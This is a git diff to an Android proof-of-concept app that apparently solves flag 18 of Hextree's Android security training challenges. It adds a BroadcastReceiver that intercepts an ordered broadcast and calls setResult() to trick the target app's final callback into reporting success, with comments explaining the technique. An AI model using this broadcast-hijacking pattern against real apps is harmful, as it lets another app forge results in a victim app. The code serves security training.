@@ -6,6 +6,7 @@ package com.vishal2376.hextreepoc
 
 
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -21,22 +22,30 @@ object DynamicReceivers {
 	private const val TAG = "@@@"
 	private val activeReceivers = mutableListOf<BroadcastReceiver>()
 
-//	private val flag18Receiver = object : BroadcastReceiver() {
-//		override fun onReceive(context: Context, intent: Intent) {
-//			Log.d(TAG, "[Flag18] action=${intent.action} extras=${intent.extras}")
-//		}
-//	}
-//
-//	private val flag19Receiver = object : BroadcastReceiver() {
-//		override fun onReceive(context: Context, intent: Intent) {
-//			Log.d(TAG, "[Flag19] action=${intent.action} extras=${intent.extras}")
-//		}
-//	}
+	/**
+	 * FLAG 18 - Hijack Broadcast Intent
+	 * Technique: Ordered broadcast interception + setResult()
+	 *
+	 * Flow:
+	 * 1. Flag18Activity sends ordered broadcast with its own receiver as the
+	 *    final callback (always runs last, regardless of priority)
+	 * 2. Final callback checks "if (resultCode != 0) success()"
+	 * 3. We register for the same action, running before that final callback
+	 * 4. We call setResult() with a non-zero code -> success() fires
+	 *
+	 * Key insight: resultReceiver param always runs last by design - no
+	 * priority tricks needed, just exist in the chain and set a result.
+	 */
+	private val flag18Receiver = object : BroadcastReceiver() {
+		override fun onReceive(context: Context, intent: Intent) {
+			Utils.dumpIntent(context, intent, "Flag 18")
+			setResult(Activity.RESULT_OK, "anything_here", null)
+		}
+	}
 
 	// Pair each receiver with the action(s) it should listen for
 	private fun all(): List<Pair<BroadcastReceiver, IntentFilter>> = listOf(
-//		flag18Receiver to IntentFilter("io.hextree.broadcast.FREE_FLAG"),
-//		flag19Receiver to IntentFilter("io.hextree.broadcast.ANOTHER_ACTION"),
+		flag18Receiver to IntentFilter("io.hextree.broadcast.FREE_FLAG"),
 	)
 
 	// ───────────────────────────────────────────────
